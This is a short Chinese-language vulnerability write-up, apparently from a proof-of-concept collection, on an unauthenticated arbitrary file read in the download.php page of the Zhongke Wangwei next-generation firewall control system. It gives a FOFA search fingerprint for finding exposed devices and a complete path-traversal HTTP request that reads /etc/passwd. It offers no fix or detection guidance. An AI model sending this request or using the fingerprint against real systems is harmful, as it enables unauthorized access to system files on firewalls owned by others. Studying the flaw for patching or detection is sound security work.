# 中科网威下一代防火墙控制系统download存在任意文件读取漏洞

# 一、漏洞简介
中科网威-防火墙控制系统是一款由中科网威有限公司开发的网络安全产品，它是基于软件的网络防火墙解决方案，为企业提供了完整的网络安全保障，漏洞点位于：download.php  由于开发人员未对该文件做鉴权，导致恶意攻击者可未授权访读取任意文件。

# 二、影响版本
+ 中科网威下一代防火墙控制系统

# 三、资产测绘
```plain
fofa：body="Get_Verify_Info(hex_md5(user_string)."
```

![1716105114884-70a33e88-bcbd-4a6e-875c-dbbbf08ca27f.png](./img/9XBQdpMPoIfBB4EZ/1716105114884-70a33e88-bcbd-4a6e-875c-dbbbf08ca27f-151998.png)

# 四、漏洞复现
```plain
GET /download.php?&class=vpn&toolname=../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close

```

![1716105138745-69a8dbc8-b354-4d9a-a1a3-ef939ec89748.png](./img/9XBQdpMPoIfBB4EZ/1716105138745-69a8dbc8-b354-4d9a-a1a3-ef939ec89748-656214.png)



> 更新: 2024-05-23 12:38:07  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qcctbq425bs1ghp6>